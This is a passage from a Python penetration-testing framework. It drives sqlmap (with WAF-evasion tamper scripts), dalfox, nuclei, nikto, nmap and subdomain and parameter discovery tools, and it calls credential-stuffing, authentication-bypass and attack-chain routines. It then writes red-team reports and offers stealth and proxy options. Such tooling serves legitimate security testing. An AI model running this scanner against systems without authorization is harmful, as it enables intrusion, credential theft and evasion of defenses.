                        self.discovered_endpoints.append({'path': f'/{path}', 'status': status, 'url': url})
                    print(f"{Fore.GREEN}[+] ffuf found {len(results)} endpoints{Style.RESET_ALL}")
        except FileNotFoundError: print(f"{Fore.YELLOW}[!] ffuf not installed{Style.RESET_ALL}")
        except Exception as e: print(f"{Fore.RED}[!] ffuf error: {e}{Style.RESET_ALL}")
        self.perf.end_phase('ffuf')

    def run_subfinder(self):
        self.perf.start_phase('subfinder')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 28] subfinder - Passive Subdomain Discovery\n{'='*70}{Style.RESET_ALL}\n")
        output_file = os.path.join(self.output_dir, 'subfinder_results.json')
        try:
            cmd = ['subfinder', '-d', self.hostname, '-all', '-oJ', '-o', output_file, '-silent', '-t', str(self.threads), '-timeout', str(self.timeout)]
            print(f"{Fore.YELLOW}[*] Running subfinder passive enumeration...{Style.RESET_ALL}")
            subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    count = 0
                    for line in f:
                        try:
                            data = json.loads(line.strip()); subdomain = data.get('host', ''); source = data.get('source', '')
                            if subdomain:
                                count += 1; self.log_result('INFO', f'Subdomain Found: {subdomain}', f'Source: {source}', 'subfinder')
                        except Exception: continue
                    print(f"{Fore.GREEN}[+] subfinder found {count} subdomains{Style.RESET_ALL}")
        except FileNotFoundError: print(f"{Fore.YELLOW}[!] subfinder not installed{Style.RESET_ALL}")
        except Exception as e: print(f"{Fore.RED}[!] subfinder error: {e}{Style.RESET_ALL}")
        self.perf.end_phase('subfinder')

    def run_httpx(self):
        self.perf.start_phase('httpx')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 29] httpx - Fast HTTP Probing\n{'='*70}{Style.RESET_ALL}\n")
        urls_file = os.path.join(self.output_dir, 'httpx_input.txt')
        urls = [self.target_url] + [ep['url'] for ep in self.discovered_endpoints[:100]]
        with open(urls_file, 'w') as f:
            for url in urls: f.write(url + '\n')
        output_file = os.path.join(self.output_dir, 'httpx_results.json')
        try:
            cmd = ['httpx', '-l', urls_file, '-status-code', '-tech-detect', '-title', '-content-length', '-json', '-o', output_file, '-silent', '-threads', str(self.threads), '-timeout', str(self.timeout)]
            print(f"{Fore.YELLOW}[*] Running httpx probing...{Style.RESET_ALL}")
            subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        try:
                            data = json.loads(line.strip()); url = data.get('url', ''); status = data.get('status_code', 0)
                            title = data.get('title', ''); techs = data.get('tech', [])
                            if techs:
                                for tech in techs: self.log_result('INFO', f'Technology Detected: {tech}', f'URL: {url}', 'httpx')
                            if title: self.log_result('INFO', f'Page Title: {title[:50]}', f'URL: {url} | Status: {status}', 'httpx')
                        except Exception: continue
        except FileNotFoundError: print(f"{Fore.YELLOW}[!] httpx not installed{Style.RESET_ALL}")
        except Exception as e: print(f"{Fore.RED}[!] httpx error: {e}{Style.RESET_ALL}")
        self.perf.end_phase('httpx')

    def run_dalfox(self):
        self.perf.start_phase('dalfox')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 30] dalfox - Advanced XSS Scanner\n{'='*70}{Style.RESET_ALL}\n")
        output_file = os.path.join(self.output_dir, 'dalfox_results.json')
        try:
            cmd = ['dalfox', 'url', self.target_url, '--format', 'json', '--output-file', output_file, '--silence', '--multicast', '--deep-domxss', '--remote-payloads', 'portswigger', '--timeout', str(self.timeout)]
            print(f"{Fore.YELLOW}[*] Running dalfox XSS scan...{Style.RESET_ALL}")
            subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    for line in f:
                        try:
                            data = json.loads(line.strip())
                            if data.get('type') == 'Verified':
                                param = data.get('param', ''); url = data.get('url', '')
                                self.log_result('HIGH', 'XSS Vulnerability Confirmed', f'Parameter: {param} | URL: {url}', 'dalfox')
                        except Exception: continue
        except FileNotFoundError: print(f"{Fore.YELLOW}[!] dalfox not installed{Style.RESET_ALL}")
        except Exception as e: print(f"{Fore.RED}[!] dalfox error: {e}{Style.RESET_ALL}")
        self.perf.end_phase('dalfox')

    def run_gau(self):
        self.perf.start_phase('gau')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 31] gau - Historical URL Discovery\n{'='*70}{Style.RESET_ALL}\n")
        output_file = os.path.join(self.output_dir, 'gau_results.txt')
        try:
            cmd = ['gau', '--subs', '--threads', str(self.threads), '--providers', 'wayback,commoncrawl,urlscan', self.hostname]
            print(f"{Fore.YELLOW}[*] Running gau historical URL discovery...{Style.RESET_ALL}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if result.stdout:
                urls = result.stdout.strip().split('\n')
                interesting_patterns = [r'\.(php|asp|aspx|jsp|cgi)', r'(admin|login|config|backup|sql|db)', r'\.(js|json|xml|yml|yaml|env)']
                interesting_urls = []
                for url in urls:
                    for pattern in interesting_patterns:
                        if re.search(pattern, url, re.I): interesting_urls.append(url); break
                with open(output_file, 'w') as f:
                    for url in urls: f.write(url + '\n')
                for url in interesting_urls[:50]: self.log_result('INFO', f'Historical URL: {url[:80]}', 'Found in web archives', 'gau')
                print(f"{Fore.GREEN}[+] gau found {len(urls)} URLs ({len(interesting_urls)} interesting){Style.RESET_ALL}")
        except FileNotFoundError: print(f"{Fore.YELLOW}[!] gau not installed{Style.RESET_ALL}")
        except Exception as e: print(f"{Fore.RED}[!] gau error: {e}{Style.RESET_ALL}")
        self.perf.end_phase('gau')

    def run_paramminer(self):
        self.perf.start_phase('paramminer')
        print(f"\n{Fore.CYAN}{'='*70}\n[MODULE 32] paramminer - Hidden Parameter Discovery\n{'='*70}{Style.RESET_ALL}\n")
        output_file = os.path.join(self.output_dir, 'paramminer_results.json')
        wordlist = self.config['wordlists'].get('parameters', '/root/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt')
        try:
            cmd = ['paramminer', '-u', self.target_url, '-w', wordlist, '-o', output_file, '--threads', str(self.threads)]
            print(f"{Fore.YELLOW}[*] Running paramminer...{Style.RESET_ALL}")
            subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    try:
                        data = json.load(f); params = data.get('parameters', [])
                        for param in params:
                            name = param.get('name', ''); param_type = param.get('type', '')
                            self.log_result('MEDIUM', f'Hidden Parameter Found: {name}', f'Type: {param_type}', 'paramminer')
                    except Exception: pass
        except FileNotFoundError: print(f"{Fore.YELLOW}[!] paramminer not installed{Style.RESET_ALL}")
        except Exception as e: print(f"{Fore.RED}[!] paramminer error: {e}{Style.RESET_ALL}")
        self.perf.end_phase('paramminer')

    def run_nmap(self):
        self.perf.start_phase('nmap')
        print(f"\n{Fore.CYAN}{'='*70}\n[TOOL] Nmap Reconnaissance\n{'='*70}{Style.RESET_ALL}\n")
        xml_file = os.path.join(self.output_dir, 'nmap_results.xml')
        try:
            subprocess.run(['nmap', '-sV', '-sC', '-O', '--open', '-T4', '-oX', xml_file, self.hostname], capture_output=True, text=True, timeout=600)
            if os.path.exists(xml_file):
                tree = ET.parse(xml_file); root = tree.getroot()
                for port in root.findall('.//port'):
                    state = port.find('state'); service = port.find('service')
                    if state is not None and state.get('state') == 'open':
                        sname = service.get('name', 'unknown') if service is not None else 'unknown'
                        prod = service.get('product', '') if service is not None else ''
                        ver = service.get('version', '') if service is not None else ''
                        self.log_result('INFO', f'Port {port.get("portid")}: {sname}', f'{prod} {ver}'.strip(), 'Nmap')
                        if prod and ver: self.context['versions'][prod] = ver
        except Exception as e: print(f"{Fore.RED}[!] Nmap error: {e}{Style.RESET_ALL}")
        self.perf.end_phase('nmap')

    def run_nikto(self):
        self.perf.start_phase('nikto')
        print(f"\n{Fore.CYAN}{'='*70}\n[TOOL] Nikto Web Scan\n{'='*70}{Style.RESET_ALL}\n")
        csv_file = os.path.join(self.output_dir, 'nikto_results.csv')
        try:
            subprocess.run(['nikto', '-h', self.target_url, '-Format', 'csv', '-output', csv_file, '-timeout', '5', '-maxtime', '120s'], capture_output=True, text=True, timeout=180)
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                    reader = csv.reader(f); next(reader, None)
                    for i, row in enumerate(reader):
                        if len(row) >= 6: self.log_result('MEDIUM', f'Nikto #{i+1}', row[5][:200], 'Nikto')
        except Exception: pass
        self.perf.end_phase('nikto')

    def run_sqlmap_enhanced(self):
        self.perf.start_phase('sqlmap')
        print(f"\n{Fore.CYAN}{'='*70}\n[TOOL] Enhanced SQLMap\n{'='*70}{Style.RESET_ALL}\n")
        out_dir = os.path.join(self.output_dir, 'sqlmap_results')
        Path(out_dir).mkdir(parents=True, exist_ok=True)
        try:
            cmd = ['sqlmap', '-u', self.target_url, '--batch', '--level=3', '--risk=2', '--threads=5', '--forms', '--crawl=2', '--random-agent', '--output-dir', out_dir, '--flush-session', '--disable-coloring']
            if self.waf_detected: cmd.extend(['--tamper=space2comment,between,charencode'])
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if 'injectable' in proc.stdout.lower() or 'vulnerable' in proc.stdout.lower():
                self.log_result('CRITICAL', 'SQLMap Confirmed Injection', f'Check {out_dir}', 'SQLMap')
        except Exception: pass
        self.perf.end_phase('sqlmap')

    def run_nuclei(self):
        self.perf.start_phase('nuclei')
        print(f"\n{Fore.CYAN}{'='*70}\n[TOOL] Nuclei Scan (13k+ Templates)\n{'='*70}{Style.RESET_ALL}\n")
        template_dir = os.path.expanduser('~/nuclei-templates')
        if not os.path.exists(template_dir): self.perf.end_phase('nuclei'); return
        out_file = os.path.join(self.output_dir, 'nuclei_results.json')
        try:
            cmd = ['nuclei', '-u', self.target_url, '-t', template_dir, '-severity', 'critical,high,medium,low', '-json', '-output', out_file, '-silent', '-rate-limit', '150', '-timeout', '10']
            subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            if os.path.exists(out_file):
                with open(out_file, 'r') as f:
                    for line in f:
                        try:
                            res = json.loads(line.strip())
                            self.log_result(res.get('info', {}).get('severity', 'INFO').upper(), f'Nuclei: {res.get("info", {}).get("name", "Unknown")}', res.get('matched-at', ''), 'Nuclei')
                        except Exception: continue
        except Exception: pass
        self.perf.end_phase('nuclei')

    def run_hashcat_analysis(self):
        self.perf.start_phase('hashcat')
        print(f"\n{Fore.CYAN}{'='*70}\n[TOOL] Hashcat Analysis\n{'='*70}{Style.RESET_ALL}\n")
        self.log_result('INFO', 'Hashcat Ready', 'Hashcat integrated for hash cracking.', 'Hashcat')
        self.perf.end_phase('hashcat')

    def validate_findings(self):
        self.perf.start_phase('validation')
        for f in self.results: f['confidence'] = 'HIGH' if f['severity'] == 'CRITICAL' else 'MEDIUM'
        self.perf.end_phase('validation')

    def save_state(self):
        with open(self.scan_state_file, 'wb') as f:
            pickle.dump({'target': self.target_url, 'results': self.results, 'endpoints': self.discovered_endpoints}, f)

    def generate_reports(self):
        print(f"\n{Fore.CYAN}[*] Generating reports...{Style.RESET_ALL}")
        perf = self.perf.get_report()
        with open(os.path.join(self.output_dir, 'report.json'), 'w') as f:
            json.dump({
                'target': self.target_url, 'date': datetime.now().isoformat(),
                'self_protection_enabled': self.self_protection_enabled,
                'findings': self.results, 'perf': perf,
                'context': {
                    'credentials': len(self.context['credentials']),
                    'hashes': len(self.context['hashes']),
                    'versions': len(self.context['versions']),
                    'configs': len(self.context['configs']),
                    'logic_flaws': len(self.context['logic_flaws'])
                }
            }, f, indent=2)

        html_template = Template("""<!DOCTYPE html><html><head><title>Red Team Report</title>
<style>
body{font-family:sans-serif;margin:20px;background:#f5f5f5}
.container{max-width:1200px;margin:0 auto;background:#fff;padding:30px;border-radius:10px}
h1{color:#2c3e50;border-bottom:4px solid #e74c3c}
.finding{border-left:5px solid #3498db;padding:15px;margin:10px 0}
.CRITICAL{border-color:#e74c3c;background:#fef5f5}
.HIGH{border-color:#e67e22}
.MEDIUM{border-color:#f39c12}
.severity{font-weight:bold;padding:5px 10px;border-radius:5px;color:#fff}
.severity.CRITICAL{background:#e74c3c}
.severity.HIGH{background:#e67e22}
.severity.MEDIUM{background:#f39c12}
.context-box{background:#e8f4f8;padding:15px;border-radius:5px;margin:20px 0}
.protection-box{background:#fff3cd;padding:15px;border-radius:5px;margin:20px 0;border-left:5px solid #ffc107}
</style></head><body><div class="container">
<h1>Red Team Penetration Test Report</h1>
<p><strong>Target:</strong> {{ target }} | <strong>Date:</strong> {{ date }}</p>
<div class="protection-box">
<h3>Operational Security</h3>
<p><strong>Self-Protection:</strong> {{ protection_status }} | <strong>Blocks Detected:</strong> {{ blocks }}</p>
</div>
<div class="context-box">
<h3>Attack Context</h3>
<p><strong>Credentials Found:</strong> {{ context.creds }} | <strong>Hashes:</strong> {{ context.hashes }} | <strong>Versions:</strong> {{ context.versions }} | <strong>Logic Flaws:</strong> {{ context.logic_flaws }}</p>
</div>
<h2>Findings ({{ total }})</h2>
{% for r in results %}<div class="finding {{ r.severity }}">
<h3><span class="severity {{ r.severity }}">{{ r.severity }}</span> {{ r.title }}</h3>
<p><strong>Tool:</strong> {{ r.tool }} | {{ r.description }}</p></div>{% endfor %}
</div></body></html>""")
        with open(os.path.join(self.output_dir, 'report.html'), 'w') as f:
            f.write(html_template.render(
                target=self.target_url, date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                total=len(self.results), results=self.results,
                protection_status="ENABLED" if self.self_protection_enabled else "DISABLED",
                blocks=str(perf.get('blocks_detected', {})),
                context={'creds': len(self.context['credentials']), 'hashes': len(self.context['hashes']), 'versions': len(self.context['versions']), 'logic_flaws': len(self.context['logic_flaws'])}
            ))
        print(f"{Fore.GREEN}[+] Reports saved to {self.output_dir}/{Style.RESET_ALL}")

    def run_scan(self, run_hydra=False, username=None, wordlist=None):
        self.banner()
        self.perf.start()

        self.fingerprint_technology()
        self.detect_waf()
        self.check_ssl_tls()
        self.analyze_security_headers()

        self.run_subfinder()
        self.run_gau()

        self.comprehensive_directory_discovery()
        self.run_ffuf()
        self.test_api_endpoints()
        self.enumerate_subdomains()
        self.discover_and_test_forms()

        self.run_httpx()

        self.comprehensive_xss_testing()
        self.run_dalfox()
        self.comprehensive_sqli_testing()
        self.comprehensive_lfi_testing()
        self.comprehensive_command_injection_testing()

        self.run_paramminer()

        self.protocol_level_attacks()
        self.authentication_bypass()
        self.advanced_sqli()
        self.advanced_xss()
        self.race_condition_attacks()
        self.advanced_evasion()

        self.adapt_to_waf()
        self.validate_exploitation()
        self.automated_credential_stuffing()

        self.run_nmap()
        self.run_nikto()
        self.run_sqlmap_enhanced()
        self.run_nuclei()
        self.run_hashcat_analysis()

        chain_engine = AttackChainEngine(self)
        chain_engine.analyze_and_execute_chains()

        self.validate_findings()
        self.perf.stop()
        self.save_state()
        self.generate_reports()

        perf = self.perf.get_report()
        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✓ RED TEAM PENETRATION TEST COMPLETE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        print(f"Total Findings:    {len(self.results)}")
        print(f"Duration:          {perf['total_duration']}")
        print(f"Requests:          {perf['total_requests']} ({perf['requests_per_second']} req/s)")
        print(f"Self-Protection:   {'ENABLED' if self.self_protection_enabled else 'DISABLED'}")
        if self.self_protection_enabled:
            print(f"Blocks Detected:   {perf['blocks_detected']}")
        print(f"Reports:           {self.output_dir}/")
        print(f"\n{Fore.CYAN}Attack Context:{Style.RESET_ALL}")
        print(f"  Credentials: {len(self.context['credentials'])}")
        print(f"  Hashes:      {len(self.context['hashes'])}")
        print(f"  Versions:    {len(self.context['versions'])}")
        print(f"  Logic Flaws: {len(self.context['logic_flaws'])}")
        print(f"  Users:       {len(self.context['users'])}")


def load_config(config_path):
    if config_path and os.path.exists(config_path):
        with open(config_path, 'r') as f:
            config = DEFAULT_CONFIG.copy()
            config.update(yaml.safe_load(f))
            return config
    return DEFAULT_CONFIG.copy()


def main():
    parser = argparse.ArgumentParser(
        description='Professional Red Team Penetration Testing Framework v14.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 scanner.py -t http://localhost:8080
  python3 scanner.py -t http://localhost:8080 -p extreme
  python3 scanner.py -t http://target.com -p aggressive --self-protect
  python3 scanner.py -t http://target.com -p aggressive --self-protect --proxies proxies.txt
        """
    )
    parser.add_argument('-t', '--target', required=True, help='Target URL')
    parser.add_argument('-p', '--profile', choices=['stealth', 'normal', 'aggressive', 'extreme'], default='aggressive')
    parser.add_argument('-c', '--config', help='YAML config file path')
    parser.add_argument('-o', '--output', default='/tmp/scan_results', help='Output directory')
    parser.add_argument('--hydra', action='store_true', help='Enable Hydra brute-force')
    parser.add_argument('--user', default='admin', help='Hydra username')
    parser.add_argument('--wordlist', help='Hydra wordlist path')
    parser.add_argument('--self-protect', action='store_true', help='Enable self-protection system (slower but stealthier)')
    parser.add_argument('--proxies', help='Path to proxies file (one per line: ip:port or user:pass@ip:port)')
    args = parser.parse_args()

    if not args.target.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[!] Target must start with http:// or https://{Style.RESET_ALL}")
        sys.exit(1)

    print(f"\n{Fore.YELLOW}{'!'*70}\n️  AUTHORIZATION REQUIRED\n{'!'*70}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Only use on systems you own or have written permission to test.{Style.RESET_ALL}")
    if input(f"\n{Fore.CYAN}Do you have authorization? (yes/no): {Style.RESET_ALL}").lower() != 'yes':
        print(f"{Fore.RED}[!] Aborted{Style.RESET_ALL}")
        sys.exit(0)

    config = load_config(args.config)
    config['scan_profile'] = args.profile
    config['output_dir'] = args.output
    config['self_protection'] = args.self_protect
    config['proxies_file'] = args.proxies

    scanner = ProfessionalSecurityScanner(target_url=args.target, config=config)
    scanner.run_scan(run_hydra=args.hydra, username=args.user, wordlist=args.wordlist)


if __name__ == '__main__':
    main()
